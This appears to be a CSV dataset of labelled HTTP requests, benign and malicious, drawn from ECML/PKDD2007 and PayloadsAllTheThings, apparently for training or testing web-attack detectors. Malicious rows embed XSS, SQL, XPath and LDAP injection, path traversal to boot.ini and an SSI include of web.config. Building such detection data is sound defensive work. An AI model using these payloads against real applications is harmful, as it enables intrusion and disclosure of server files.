attack_type,difficulty_bucket,difficulty_score,label,raw_request,request_id,request_len,sample_id,source_dataset,source_payload
,hard,-2.0,benign,"GET /i8lVOXJoQI/eiwrrcwergdPo/swsanv/mmrotnvktibede/gldoClKbtsSkg-ZvPW.html?xrkf9bdhe=e0DL%40K-8d&hrlj=lnimtaoe&laVq2P.x.l03=%5Ct%2Buuecanecp&ottBntzrsfnt=tIi0Iz&tisagpnnEfbtire=34876612&voaOree8aGam=s HTTP/1.0
Host: www.sntamun.org
Connection: close
Accept: text/*
Accept-Charset: windows-1254;q=0.5, iso-8859-8, x-mac-arabic, koi8;q=0.7
Accept-Encoding: *
Accept-Language: *
Cache-Control: no-transform
Client-ip: 110.118.82.42
Cookie: C9SZ=ace'eslbp eeae;aiibhev9sH5ele=991699061;asnav=jBdg0bC.4E2z
Cookie2: $Version=""37""
Date: Mon, 12 Dec 05 08:05:36 GMT
ETag: ""L-TQsQGzGcoyaScA1rs""
Expect: 100-continue
From: s8hvitrs@euHho.st
If-Modified-Since: Sat, 24 Apr 10 03:01:47 GMT
If-Unmodified-Since: Wed, 21 Sep 05 09:58:22 GMT
If-Match: *
If-None-Match: ""3XDonp0HhorGn5pvdRL""
If-Range: "".IPKjer5XO2NbZz""
Max-Forwards: 2
MIME-Version: 8.4
Pragma: no-cache
Proxy-Authorization: jjvPD Tebkhb=8eehmla
Authorization: Digest algorithm=MD5
Range: 986633-,-445,64-7061
Referer: http://n1nhrroc.gov/jlres/ee1qhdc/oeiT/nutx.mpeg
TE: trailers
Trailer: Accept-Charset
User-Agent: Lw8a4/2.3
UA-CPU: 68000
UA-Disp: 7939,4903,8
UA-OS: Mac OS X
UA-Color: color32
UA-Pixels: 7780x7588
Via: HTTP/9.6 www.qoeyRc.html:579
Transfer-Encoding: gojah
Upgrade: tiowa/3.9, SsnfV/0.1
Warning: 751 www.ninm.html ""eskobLtz"" 
X-Forwarded-For: 147.149.106.113
X-Serial-Number: 738264285065396
----: --------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",13986,1477,xml_test-13986,ECML/PKDD2007,
,hard,-2.0,benign,"POST /otrotA/lfohphhc5/nfdtm/Taeqntbcwc5vlpuoSE94/r5gmY3faGe.tiff? HTTP/1.1
Content-Length: 216
Content-Language: seaAo,l2e,rtrrd
Content-Encoding: compress
Content-Location: http://www.ydsel1.uk/glh0/EtNdia2/indse/97ggy/ty47sHe.sh
Content-MD5: dHRlbXRydGVlYWVrMWkydA==
Content-Type: application/x-www-form-urlencoded
Expires: Tue, 16 May 06 18:13:59 GMT
Last-Modified: Sat, 24 Dec 05 19:09:13 CET
Host: www.DxlnBp.cz
Connection: otht
Accept: video/*;q=0.1
Accept-Charset: windows-1252;q=0.6
Accept-Encoding: 
Accept-Language: *;q=0.4
Cache-Control: no-store
Client-ip: 68.59.175.92
Cookie: yickTwrt1mbre=>whererboot.ini;CJJOcj9o=9w
Cookie2: $Version=""187""
Date: Wed, 15 Mar 06 19:55:19 GMT
ETag: ""yty6mQFBlm2dqjw""
Expect: ieb2qasi=Otwexie9;htae4ao
From: tietc@t0ytt.net
If-Modified-Since: Mon, 14 Aug 06 14:35:28 UTC
If-Unmodified-Since: Wed, 14 Apr 04 16:28:25 CET
If-Match: *
If-None-Match: ""n4sbpKK9a1WHwdSNV7h""
If-Range: Sun, 28 May 06 20:03:10 CET
Max-Forwards: 12
MIME-Version: 1.6
Pragma: no-cache
Proxy-Authorization: Digest username=""3htdpnp1""
Authorization: les4s rtcIc=tswor
Range: 254982-39
Referer: http://www.n7aasasq.st/Eai9ww.wav
TE: trailers,trailers
Trailer: Warning
User-Agent: Mozilla/6.5 (X11; U; Linux i586 2.8; ee-hh; rv:0.9.4) Gecko/03530498
UA-CPU: PowerPC
UA-Disp: 4653,644,8
UA-OS: Windows NT
UA-Color: color8
UA-Pixels: 1982x002
Via: HTTP/8.9 www.ey8esl.shtml
Transfer-Encoding: scau2
Upgrade: ict/4.3, tseu/9.1, eolz/4.5, eeiuje/9.5
Warning: 650 www.SRhlh0nf.jpeg ""naorss8mXmrab"" ""Sat, 28 Mar 09 21:13:32 GMT""
X-Forwarded-For: 7.63.26.112
X-Serial-Number: 6132370347859311136
----: ----------
~~~~~: ~~~~~~~~~~~~~~~~~~~

cueooret=o18&IbooiaooZ3itdE=lNa&adsv= nxdhtpassrsC6m==&C7.oG=lsamoO&oho98MeNb6=4490728972&bgaoyo=t4E&lInrageopmm=rvt;styles~5lz8vy &d5aeejenk7Br0=37&Lfwra=145505&ewhcn4=tMr&iTCeht1rhsnnlq=<eandiservicesNidh",33897,1909,xml_test-33897,ECML/PKDD2007,
SQLi,medium,3.0,malicious,"PUT /Oeas/sj0Dcr4/sf2t/aizAjE2pq7Pl/strenFthrabH/oPM/7geFG/soacsaM59seoieu4e8s.html? HTTP/1.1
Content-Length: 243
Content-Language: nitdd9
Content-Encoding: identity
Content-Location: /Htst/a7sif.mdb
Content-MD5: RXMzb25lbjl1OWxwaHNIRQ==
Content-Type: application/x-www-form-urlencoded
Expires: Sun, 24 Aug 08 03:13:43 CET
Last-Modified: Fri, 09 May 08 16:26:01 CET
Host: 148.111.115.142
Connection: keep-alive
Accept: */*
Accept-Charset: x-mac-turkish, euc-kr, iso-8859-4;q=0.5, iso-8859-1;q=0.9, koi8;q=0.4
Accept-Encoding: gzip, deflate, deflate;q=0.5, gzip, gzip
Accept-Language: sa0-t;q=0.6
Cache-Control: max-stale
Client-ip: 14.26.245.53
Cookie: sssbuq=OrigText'OR'tSA' =  'ietinnotd'
Cookie2: $Version=""108""
Date: Fri, 09 Jul 04 09:12:52 GMT
ETag: ""3spb4TK2EuEY@0A""
Expect: esschl5x=6ResY
From: rlte@rs4T41y.it
If-Modified-Since: Sun, 06 Mar 05 12:26:05 GMT
If-Unmodified-Since: Fri, 01 Jun 07 07:41:41 UTC
If-Match: *
If-None-Match: ""LqIwakH4phFYcNfHD""
If-Range: ""aUuBkNFWQB9EK9bwv""
Max-Forwards: 8634
MIME-Version: 2.2
Pragma: no-cache
Proxy-Authorization: NTLM cmxlZWxhYWFlZGllc3RuZ2hOVEV0SW9zb2VuaTBlM3NvaQ==
Authorization: Basic U3N0cnNpOnBzdGJz
Range: 48614-31991
Referer: http://nloa.ch/ehknia/4Tme/ilnt.msf
TE: trailers,trailers,trailers
Trailer: If-Unmodified-Since
User-Agent: iria0/3.3
UA-CPU: MIPS
UA-Disp: 6479,305,32
UA-OS: Win98
UA-Color: color8
UA-Pixels: 957x8790
Via: 9.1 196.208.64.144:51063
Transfer-Encoding: identity
Upgrade: usuiD/4.0, 7hqfn/1.3, ua0l/0.7, ndst/6.3
Warning: 055 www.uztrr9on.js ""pnHydeIeedjteb3"" 
X-Forwarded-For: 235.103.6.212
X-Serial-Number: 40137446111101
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

aost1paw=s]ahtaccesCiperaeal|itr/&cRrteet1t=67808171&0bCExaA=awoEtnltttadnM&gceceeinki=h|ohw7l&sTCufkp1l=4 rnL&-HdrophFwinntwcs3UB=5irhttp&itprr=7177&cct3aeugea=c|t89&ecec=596633&neesnlkxtozrslb=ai&mEoaer5Cia1rm=08371&Wrki3ahH=r>wu",42739,1930,xml_test-42739,ECML/PKDD2007,
XSS,medium,,malicious,"GET /login?q=""'><img src=xxx:x \x2Fonerror=javascript:alert(1)> HTTP/1.1
Host: intranet.local
User-Agent: curl/8.0.1
Accept: */*
Connection: close",,150,patt-xss-1265,PayloadsAllTheThings,"""'><img src=xxx:x \x2Fonerror=javascript:alert(1)>"
XPath Injection,medium,4.5,malicious,"PUT /2PEh4O/82D/Yp-7@/tfbtramwc/tKQUbp37m3jD083alsdY/VPwEb4MHtmp2H.msf? HTTP/1.1
Content-Length: 221
Content-Language: shg,rreyue,n
Content-Encoding: gzip
Content-Location: /mddsy/lAln/IaAenl.dll
Content-MD5: dWV0aGE5c2ZtZTRyZHM1bg==
Content-Type: application/x-www-form-urlencoded
Expires: Fri, 01 Jun 07 04:51:35 UTC
Last-Modified: Sun, 24 Jun 07 22:46:03 CET
Host: www.euhisdApsf.ch
Connection: close
Accept: */*;q=0.3
Accept-Charset: us-ascii;q=0.1
Accept-Encoding: 
Accept-Language: p9-yrsnihny;q=0.0, ljdnafn2-wun3rs;q=0.9
Cache-Control: min-fresh=955
Cookie: u0teseS8x7teic=O/f/m/child::node()[  position()=117]     |   cmr/m/fbni/child::text()[position()=969]    or     'Eb'  =   '
Cookie2: $Version=""8""
Date: Fri, 12 May 06 21:48:24 GMT
If-Unmodified-Since: Sat, 13 Oct 07 09:48:43 UTC
If-Range: *
Referer: http://7Tcleare.uk/htDos.asp
User-Agent: Mozilla/6.3 (compatible; 5enhul0xzy; Open BSD i386; Srmoerc0; haez)
Transfer-Encoding: cHen9e

0paceozmineDir=u&OdWQH=l96yXtU&iisiiIeo5Sf=27&ib8tlfesc=t &neekelltwi5ne=53932&2t=eisaeM&dnozE4kta=6&7Nohsnho=7846&yf.@echo@gxY=eiee0t&pemovo8=6enllyahiCriA&ledto6txaeioy=4760966&8m@us=a-yXt&uodhgds7r=cjejtu&sgd=217709207",35919,1198,xml_test-35919,ECML/PKDD2007,
SQLi,medium,3.0,malicious,"GET /el8nad0Cebrinyol/ie7lHAwetasdemft8.jpg?Snmmoatenri=e&0u=2838&d67xllrhtimV=%27+OR+%27uSoaonwule%27+++++%3D+++++N%27+++++&lihaoeosgiek=itcid1agovbNni&Hoadgoii=hui1 HTTP/1.1
Host: 225.48.63.99
Connection: shmml
Accept: application/postscript
Accept-Charset: koi8;q=0.1
Accept-Encoding: compress, gzip
Accept-Language: iihu-masrast
Cache-Control: only-if-cached
Client-ip: 144.73.242.147
Cookie: boomtieotjeie=32870588;nrnntl=ta;PzliRt=b63
Cookie2: $Version=""76""
Date: Tue, 06 Apr 04 20:41:18 CET
ETag: ""YaiKF0rmASDK-26T""
Expect: rpe2
From: bs1as@pton6i0pc.org
If-Modified-Since: Sat, 26 Nov 05 21:59:05 GMT
If-Unmodified-Since: Tue, 21 Apr 09 01:33:47 CET
If-Match: ""OdKa-wpU2-1m6YB""
If-None-Match: *
If-Range: Wed, 20 May 09 24:21:17 UTC
Max-Forwards: 5
MIME-Version: 3.7
Pragma: vncfeta=jgrxinin
Proxy-Authorization: Basic YWVzZWV2RzpodTFo
Authorization: Digest algorithm=MD5
Range: 79786-446
Referer: /aov5/sddeaeI/Upnjmmo/hoe0C.php4
TE: trailers,trailers,gzip
Trailer: Via
User-Agent: Mozilla/1.4 (Windows; U; Windows NT 0.8; 5l-6l; rv:2.8.8) Gecko/30601506
UA-CPU: x86
UA-Disp: 1092,0849,8
UA-OS: Win95
UA-Color: color32
UA-Pixels: 8264x986
Via: 3.9 www.inolmAu.css, 9.6 162.16.131.228, 0.4 www.ss3o.jpg
Transfer-Encoding: compress
Upgrade: e2torm/4.8, rnb/5.6, cpieM/3.1, alfi/8.5
Warning: 787 15.186.185.51 ""wdceb"" 
X-Forwarded-For: 10.31.99.179
X-Serial-Number: 49861
----: -----------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",42538,1491,xml_test-42538,ECML/PKDD2007,
,hard,-2.0,benign,"GET /thGtulasspJn9/1EWrt2Y46G/rItmfTbLNS_e975@/s9x4sagaa/7nvhwhereT/QSt_K72uwmail-9RM7/fromm3nwindow.openT/dhjnonc7/3nnoesieewptq/eQhRvE/gaiei5rmAkYlLAmrri.asp?alysloie35R=v2ei+aermdwp-ie&rwal=7odou HTTP/1.1
Host: 64.90.150.43
Connection: nenln
Accept: text/xml, image/*;q=0.9, image/*;q=0.7
Accept-Charset: iso-8859-1, iso-8859-15;q=0.7
Accept-Encoding: *
Accept-Language: sslc-So6p;q=0.3, r-B, hvzgya0h-l2;q=0.1
Cache-Control: max-stale=184
Client-ip: 214.249.83.255
Cookie: etsie=896047;chprdh3hax5ya=w58s0oZQH_eI;2theaofsr6nlrIn=emvqeSM;1JKSo5aRpXi=tm8)s;ddswt=~lsa eBdischdn
Cookie2: $Version=""12""
Date: Thu, 27 Sep 07 07:22:33 GMT
ETag: W/""jMOh75yYYBefnn43znI""
Expect: 100-continue
From: suaPf@niebaoeya.org
If-Modified-Since: Mon, 03 May 10 04:48:41 GMT
If-Unmodified-Since: Mon, 06 Jul 09 04:56:18 UTC
If-Match: ""Uzn5housFrE-nIB""
If-None-Match: *
If-Range: Wed, 21 Oct 09 16:34:26 UTC
Max-Forwards: 960
MIME-Version: 0.1
Pragma: no-cache
Proxy-Authorization: NTLM b25lc2xsYUVLZXNzbGR0b21pZXJ5YTl3YWhvZWVzdHRiaXR5aHFyZ2Rpb2tiYXJ1
Authorization: Digest realm
Range: 2-278,82-815
Referer: http://www.3ngnv.de/2fzca.js
TE: trailers
Trailer: Upgrade
User-Agent: ttrR6nmsit (sbbve1Lkc@; noTndJmov)
UA-CPU: MIPS
UA-Disp: 2709,267,16
UA-OS: Windows 95
UA-Color: color16
UA-Pixels: 437x5082
Via: FTP/0.9 www.coBe.gif:7850, 5.9 55.38.24.34
Transfer-Encoding: identity
Upgrade: r5nsd/8.4, eecerh/9.5
Warning: 703 77.103.235.152 ""rrfeeSn4cnstcAhs"" ""Sat, 09 May 09 09:03:00 GMT""
X-Forwarded-For: 25.153.217.247
X-Serial-Number: 754248
----: ---------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",29419,1654,xml_test-29419,ECML/PKDD2007,
Path Traversal,medium,,malicious,"POST /auth HTTP/1.1
Host: app.local
User-Agent: python-requests/2.31
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Connection: close

comment=/..\/..\/..\/..\/..\/..\/..\/..\{FILE}&id=2118",,216,patt-path-traversal-1118,PayloadsAllTheThings,/..\/..\/..\/..\/..\/..\/..\/..\{FILE}
LDAP Injection,medium,,malicious,"POST /search HTTP/1.1
Host: demo.local
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
Connection: close

username=(&(sn=administrator)(password=MYC*)) : KO&id=1212",,214,patt-ldap-injection-0212,PayloadsAllTheThings,(&(sn=administrator)(password=MYC*)) : KO
Path Traversal,medium,,malicious,"GET /profile?file=..\..\..\..\..\..\..\..\..\..\boot.ini%00 HTTP/1.1
Host: demo.local
User-Agent: curl/8.0.1
Accept: */*
Connection: close",,142,patt-path-traversal-1012,PayloadsAllTheThings,..\..\..\..\..\..\..\..\..\..\boot.ini%00
,hard,-2.0,benign,"GET /dsnhc/rtbL/Ae/heNWmEtJ.js?nfeK1aokstth=%3En&hse=evXnJkNOukJ HTTP/1.1
Host: 67.136.127.118
Connection: close
Accept: */*
Accept-Charset: cp-936;q=0.2, x-mac-chinesetrad;q=0.6, windows-1251;q=0.3, windows-1250;q=0.7
Accept-Encoding: gzip;q=0.2, gzip;q=0.5
Accept-Language: etld8Tte-iler6so
Cache-Control: only-if-cached
Client-ip: 203.1.184.86
Cookie: 9replaceexec5_5connectqtz=it4Vkl
Cookie2: $Version=""27""
Date: Sun, 06 Aug 06 18:01:56 UTC
ETag: ""mpq8MPbSS4MTt2_jKVo""
Expect: az4ds
From: ssmefI@deee3y.biz
If-Modified-Since: Tue, 18 Aug 09 19:50:37 GMT
If-Unmodified-Since: Tue, 30 Jan 07 07:15:21 CET
If-Match: ""stMSF_zQF.S0xMfqEr""
If-None-Match: ""MZeFeXh.hy.44IT_v""
If-Range: ""HfmH47NKUGeofJPU""
Max-Forwards: 8151
MIME-Version: 8.9
Pragma: mnt4e=erun
Proxy-Authorization: inwn hvne4tt=Gseae
Authorization: 6zta 0tisnra=na7ee
Range: -3953,-5
Referer: /zoud48h/i8np/0blroc.jpeg
TE: gzip;q=0.4,chunked;q=0.0
Trailer: Trailer
User-Agent: Mozilla/2.4 (Windows; U; Windows NT 6.6; Sx-Ah; rv:6.6.1) Gecko/73262590
UA-CPU: Sparc
UA-Disp: 6710,9525,32
UA-OS: Windows NT
UA-Color: color32
UA-Pixels: 9081x8193
Via: inie6/7.4 www.437e.tiff, 0.2 126.30.117.44
Transfer-Encoding: gzip
Upgrade: TyHs9i/8.3, tlee/0.2, 3Drt/8.0, nnuEe3/5.2
Warning: 569 www.oeereniu.htm:0303 ""atsetrg"" ""Wed, 17 May 06 18:16:08 CET""
X-Forwarded-For: 54.60.0.87
X-Serial-Number: 1257275939567339049
----: -----------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",3072,1496,xml_test-3072,ECML/PKDD2007,
XPath Injection,medium,,malicious,"POST /api/items HTTP/1.1
Host: app.local
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 51
Connection: close

search=' and count(/comment())=1 and '1'='1&id=1339",,209,patt-xpath-injection-0339,PayloadsAllTheThings,' and count(/comment())=1 and '1'='1
,hard,-2.0,benign,"POST /a3dB1Z_/nAYQg/3gJeekan5opw5tOfnr/WlpF4eo77/6OS7k.nsf? HTTP/1.0
Content-Length: 55
Content-Language: oncl3en,k,ice9si
Content-Encoding: gzip
Content-Location: /Ctlqi/dtoy/eTtcoh.txt
Content-MD5: bEl0RXRzd2FlZW55QzFhSQ==
Content-Type: application/x-www-form-urlencoded
Expires: Thu, 31 Jul 08 07:56:44 UTC
Last-Modified: Sat, 20 Jan 07 24:29:36 UTC
Host: www.ddcFi.be:65
Connection: keep-alive
Accept: video/*
Accept-Charset: us-ascii;q=0.9, euc-tw;q=0.8
Accept-Encoding: compress, gzip
Accept-Language: *;q=0.3
Cache-Control: no-transform
Client-ip: 85.58.53.162
Cookie: esnN9n=155427734;OfZTshutdown=qWJYeugi;onmtyonl5srn15=3;@W06=eth5wj88n
Cookie2: $Version=""5""
Date: Wed, 09 Jan 08 12:51:32 GMT
ETag: W/""@c68p_R1HCDtNdj4k0jx""
Expect: 4aeBlD=inoanbD
From: ueos@tseotr.biz
If-Modified-Since: Mon, 07 Apr 08 14:52:39 CET
If-Unmodified-Since: Wed, 26 Jan 05 15:03:07 CET
If-Match: ""fyC7VF7wLrBC3MvRI""
If-None-Match: ""30xjv4TI_f8hcK02nXX""
If-Range: *
Max-Forwards: 9570
MIME-Version: 9.1
Pragma: lISie52a='1e'
Proxy-Authorization: Basic ZGlpcm1uc3Q6eG5zaGxtaA==
Authorization: NTLM VGZJaTQ0cmU2enJ0S2MybHNpbmNnemFhb3RybmhFUmVadW96dXNTMHRlbmhzY3N3
Range: 10-,-849357
Referer: http://www.amo0etrr.ch/e1tT/thrmNur/svdrf.aspx
TE: deflate,chunked;q=0.7
Trailer: From
User-Agent: cnNhgAie (ahv.8YJhv)
UA-CPU: Sparc
UA-Disp: 2381,870,32
UA-OS: Solaris
UA-Color: color8
UA-Pixels: 6564x871
Via: FTP/3.3 www.atamup.js:35
Transfer-Encoding: compress
Upgrade: esochH/3.1, ehsqp/5.4, atmg/1.6, Aulr/8.6
Warning: 097 84.156.203.77 ""rilteriyvagst2t"" 
X-Forwarded-For: 161.237.188.1
X-Serial-Number: 4610703908
----: ----------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

iuoq2s3ec=s1ybueNNdA&rsosmrnhy4=7248&tnnas=dRskQqi3ObFK",6286,1797,xml_test-6286,ECML/PKDD2007,
XPath Injection,medium,,malicious,"POST /auth HTTP/1.1
Host: app.local
User-Agent: python-requests/2.31
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Connection: close

file=' and count(/comment())=1 and '1'='1&id=1295",,211,patt-xpath-injection-0295,PayloadsAllTheThings,' and count(/comment())=1 and '1'='1
SSI,medium,,malicious,"POST /view HTTP/1.1
Host: intranet.local
User-Agent: python-requests/2.31
Content-Type: application/x-www-form-urlencoded
Content-Length: 56
Connection: close

comment=<!--#include file=""..\..\web.config"" -->&id=1533",,223,patt-ssi-0533,PayloadsAllTheThings,"<!--#include file=""..\..\web.config"" -->"
,hard,-2.0,benign,"GET /1cI2/iW/tueh/isXHy.php?Abretsbrea=s%3D1processing-instructionechtacces4n&vhEbqU=plGc1%40w.RH HTTP/1.1
Host: 223.172.198.219:10
Connection: ptcnti
Accept: */*;q=0.4
Accept-Charset: *;q=0.8
Accept-Encoding: *;q=0.1
Accept-Language: hxbwnfe-el;q=0.4, ute-m6sRhP7;q=0.7, 5hotatos-nmdsta, Lnw-ssba;q=0.7
Cache-Control: no-store
Client-ip: 42.207.99.95
Cookie: tiaiwXeehYnhaCh=e
Cookie2: $Version=""9""
Date: Tue, 05 Jan 10 20:17:14 GMT
ETag: W/""ZNPeIbuyDuWoq.Gflf""
Expect: jpgrt=9vdtd;nsh5uen=mOEto
From: tooao@trne6cted.it
If-Modified-Since: Wed, 26 Aug 09 03:50:59 CET
If-Unmodified-Since: Wed, 30 Jan 08 09:20:52 CET
If-Match: *
If-None-Match: ""vdxNEsMSfJfyUJKC""
If-Range: ""roj1qj-mpKZ6FD.uJ8t""
Max-Forwards: 4870
MIME-Version: 0.7
Pragma: no-cache
Proxy-Authorization: irimMo rnefpib=0rSnos
Authorization: Digest qop=auth-int
Range: 374825-,-184
Referer: http://6rOmo.fr/a8d2Aedi/bet55u/M4naihl/bslvOmaN/Urfnae.ace
TE: trailers
Trailer: Date
User-Agent: sYs8tvaR http://www.eYvborm.org
UA-CPU: x86
UA-Disp: 7262,260,8
UA-OS: Windows NT
UA-Color: color16
UA-Pixels: 012x3228
Via: a6ma/5.0 126.55.10.204:6, HTTP/4.4 18.3.231.91
Transfer-Encoding: identity
Upgrade: oameu/8.0, bsste/1.0
Warning: 532 www.shkroer.shtml:1701 ""enin"" ""Sat, 30 Apr 05 12:33:33 UTC""
X-Forwarded-For: 175.87.104.128
X-Serial-Number: 42090054187399989
----: -----------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",10135,1462,xml_test-10135,ECML/PKDD2007,
,hard,-2.0,benign,"GET /mg9@replaceJjxP66u/escnoaoi9XLaKTtsNt/pieA38/0dmfromh.Ik/OttRAe/zueLrktLi1/eealyhTytinm7ei.cgi?OELDZFZ=aolusoosd8you&dgalylEeetl=c%24&calesl0h0l=3eae&te=465921&Ykb-86e=tet4w2asuuhnqd&phpmBssOXZm.=hynode+&oR3q8qy=91&wetebma8h=flieGmjmrtrateefo&ltewnimothCr=imdoirj%40o%25n%3Bu%3Ce&D5nshnaiIer1n=tVZsTGDMkYD&awetsdhsiwyesie=7&duo5yTagxet8cn=wtu0eormqhzuf&yd=4474311&tnurtsitaon=7868&sa=7816604492 HTTP/1.1
Host: 226.120.13.151
Connection: close
Accept: application/rtf;q=0.7
Accept-Charset: euc-tw;q=0.0, x-mac-turkish, utf-8, iso-10646-ucs-2
Accept-Encoding: compress;q=0.8
Accept-Language: c-glseabrd, g-rtgsqv;q=0.1, u-htmn2ide;q=0.1, 3hEoo-eos;q=0.7, W3dhe-3no
Cache-Control: only-if-cached
Client-ip: 150.105.58.192
Cookie: lyhcnsezel3f=r%i;rCfee=3108202
Cookie2: $Version=""299""
Date: Sat, 06 Aug 05 21:59:36 GMT
ETag: W/""G@R50dmYrtyF5OPvYbL""
Expect: itetett
From: uvksevoi@am3seosru.ch
If-Modified-Since: Fri, 01 Oct 04 13:25:36 UTC
If-Unmodified-Since: Tue, 16 Mar 10 23:31:02 UTC
If-Match: ""4CmEwZ3qDkbOQ1JTG""
If-None-Match: *
If-Range: Mon, 12 Feb 07 08:57:54 GMT
Max-Forwards: 8
MIME-Version: 8.6
Pragma: no-cache
Proxy-Authorization: Basic bnAzaTBkOm9yU1V2c1N0
Authorization: Basic b2lndHN0MjQ6c2h1dHZp
Range: -470982,-47168,1897-
Referer: http://www.4nanyrH.st/ehsee/TrswkddN/dTIeliat.jpeg
TE: trailers,trailers
Trailer: Date
User-Agent: egwOqXWwf http://www.i1kfa0m6.uk
UA-CPU: PowerPC
UA-Disp: 332,0643,8
UA-OS: Win95
UA-Color: color16
UA-Pixels: 690x0416
Via: FTP/9.6 58.211.72.22:36815, 8.1 www.uaya.js, HTTP/0.4 www.ld9rb.js
Transfer-Encoding: 7Itv; ncts=dtt6Tzj
Upgrade: ath/3.5, ct8ck/1.4, ijeoul/7.8, ean9p/4.9
Warning: 802 110.29.94.224 ""lAaytl0aamiAkestm"" 
X-Forwarded-For: 77.22.60.7
X-Serial-Number: 910419107013273
----: ----------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~",19528,1846,xml_test-19528,ECML/PKDD2007,
SQLi,medium,3.0,malicious,"GET /hos/pnqoe/ned@dn_8Fa.o7/e.teWL/rnullPI9K_uscriptHSnk/rqdVPXx4cZLjr8T/i4RMmA.3s.ss.nsf?qu=nArttazipRitu&ncait6a9rC=lcge7im%28+&5eeObEdi=1584378378&6tiam=%27itxr&empatasO=+h%7E&LEKPV=y%28%2Bb%27&YWjwdULkm=721&H0seo=2085&Q4GT9ii@=n.t&p9aSnnb=fNmLopenemtt+aM&enhYQT.QsZ=or++++0%3C%3E%28select++count%28*%29++from+++++us2ytbs%29&XPc4=hX-e&ee=2norjnIruxp_ HTTP/1.1
Host: 179.101.28.116
Connection: close
Accept: text/plain;q=0.0, application/x-tar
Accept-Charset: *
Accept-Encoding: *;q=0.4
Accept-Language: *
Cache-Control: no-transform
Client-ip: 155.132.155.102
Cookie: dteduioI=06706;rghynorist8=21744;stiur8s=bn3H
Cookie2: $Version=""4""
Date: Wed, 29 Aug 07 10:13:18 CET
ETag: W/""K-NkvRrlLf6gBjMEc3V""
Expect: 4onddn=eeoa33k;1ertegD=xiSjeb90
From: B9ir@tOlwn.gov
If-Modified-Since: Sun, 23 Oct 05 10:13:04 CET
If-Unmodified-Since: Fri, 11 Jul 08 13:06:21 GMT
If-Match: *
If-None-Match: *
If-Range: Sun, 03 May 09 14:11:35 CET
Max-Forwards: 664
MIME-Version: 8.3
Pragma: ajr='elrosis7'
Proxy-Authorization: Digest cnonce=""oCgves""
Authorization: Digest nc=2CdfbeAc
Range: 930-456,2355-
Referer: http://www.fflis.cz/rd7eoa/8ebsee/9ii5lty.sh
TE: trailers
Trailer: Proxy-Authorization
User-Agent: nAaia/2.9
UA-CPU: StrongARM
UA-Disp: 420,4746,32
UA-OS: Win95
UA-Color: color8
UA-Pixels: 827x876
Via: FTP/7.5 www.ac1art.jpeg, FTP/4.7 www.rancoo.shtml
Transfer-Encoding: compress
Upgrade: caha/7.7
Warning: 590 39.82.178.253 ""aiHe"" 
X-Forwarded-For: 162.78.14.7
X-Serial-Number: 045069362668
----: ---------------------
~~~~~: ~~~~~~~~~~~~~~~~",35277,1580,xml_test-35277,ECML/PKDD2007,
